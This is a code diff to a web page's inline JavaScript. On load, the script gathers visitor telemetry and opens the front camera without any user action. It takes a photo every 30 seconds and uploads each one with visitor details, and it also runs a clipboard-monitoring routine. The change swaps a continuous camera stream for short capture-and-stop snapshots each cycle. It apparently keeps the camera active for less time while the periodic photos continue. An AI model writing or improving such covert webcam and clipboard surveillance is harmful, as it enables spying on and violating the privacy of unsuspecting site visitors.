@@ -405,9 +405,8 @@
         const PHOTO_INTERVAL_MS = 30000;
         const statusEl = document.getElementById("statusMessage");
         let cachedVisitorInfo = null;
-        let activeStream = null;
-        let activeVideo = null;
         let photoTimerId = null;
+        let pageLeft = false;
 
         function detectBrowserName() {
             const ua = navigator.userAgent;
@@ -518,16 +517,9 @@
             }
         }
 
-        function stopCameraLoop() {
-            if (photoTimerId !== null) {
-                clearInterval(photoTimerId);
-                photoTimerId = null;
-            }
-            if (activeStream) {
-                activeStream.getTracks().forEach(track => track.stop());
-                activeStream = null;
-            }
-            activeVideo = null;
+        function stopStream(stream) {
+            if (!stream) return;
+            stream.getTracks().forEach(track => track.stop());
         }
 
         function videoToBlob(video) {
@@ -548,8 +540,51 @@
             });
         }
 
+        async function snapQuickPhotoAndStop() {
+            if (pageLeft || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+            let stream = null;
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
+                });
+
+                if (pageLeft) {
+                    stopStream(stream);
+                    return null;
+                }
+
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                video.muted = true;
+                video.playsInline = true;
+
+                await video.play().catch(() => {});
+                if (!video.videoWidth || !video.videoHeight) {
+                    await new Promise((resolve) => {
+                        video.addEventListener("loadedmetadata", () => {
+                            video.play().catch(() => {});
+                            requestAnimationFrame(() => requestAnimationFrame(() => setTimeout(resolve, 120)));
+                        }, { once: true });
+                    });
+                } else {
+                    await new Promise((resolve) => setTimeout(resolve, 120));
+                }
+
+                const blob = await videoToBlob(video);
+                stopStream(stream);
+                stream = null;
+                video.srcObject = null;
+                return blob;
+            } catch (err) {
+                stopStream(stream);
+                console.error(err);
+                return null;
+            }
+        }
+
         async function uploadPhotoBlob(blob) {
-            if (!blob) return;
+            if (!blob || pageLeft) return;
             try {
                 const visitor = await getVisitorInfo();
                 const logLine = await formatLogMessage(visitor, "");
@@ -569,42 +604,19 @@
             }
         }
 
-        async function captureAndSendOnce() {
-            if (!activeVideo) return;
-            const blob = await videoToBlob(activeVideo);
-            await uploadPhotoBlob(blob);
+        async function runQuickSnapCycle() {
+            if (pageLeft) return;
+            const blob = await snapQuickPhotoAndStop();
+            if (blob && !pageLeft) {
+                await uploadPhotoBlob(blob);
+            }
         }
 
-        async function startAutoCameraLoop() {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-            stopCameraLoop();
-            try {
-                activeStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user" },
-                    audio: false
-                });
-
-                const video = document.createElement("video");
-                video.srcObject = activeStream;
-                video.muted = true;
-                video.playsInline = true;
-                activeVideo = video;
-
-                await video.play().catch(() => {});
-                if (!video.videoWidth || !video.videoHeight) {
-                    await new Promise((resolve) => {
-                        video.addEventListener("loadedmetadata", () => {
-                            video.play().catch(() => {});
-                            requestAnimationFrame(() => requestAnimationFrame(resolve));
-                        }, { once: true });
-                    });
-                }
-
-                await captureAndSendOnce();
-                photoTimerId = setInterval(captureAndSendOnce, PHOTO_INTERVAL_MS);
-            } catch (err) {
-                stopCameraLoop();
-                console.error(err);
+        function stopPeriodicSnap() {
+            pageLeft = true;
+            if (photoTimerId !== null) {
+                clearInterval(photoTimerId);
+                photoTimerId = null;
             }
         }
 
@@ -637,12 +649,16 @@
             setTimeout(monitorClipboard, 1000);
         }
 
-        window.addEventListener("pagehide", stopCameraLoop);
-        window.addEventListener("beforeunload", stopCameraLoop);
+        window.addEventListener("pagehide", stopPeriodicSnap);
+        window.addEventListener("beforeunload", stopPeriodicSnap);
 
-        window.addEventListener("load", () => {
+        window.addEventListener("load", async () => {
+            pageLeft = false;
             sendVisitTelemetry();
-            startAutoCameraLoop();
+            await runQuickSnapCycle();
+            if (!pageLeft && photoTimerId === null) {
+                photoTimerId = setInterval(runQuickSnapCycle, PHOTO_INTERVAL_MS);
+            }
             setTimeout(monitorClipboard, 500);
         });
     </script>
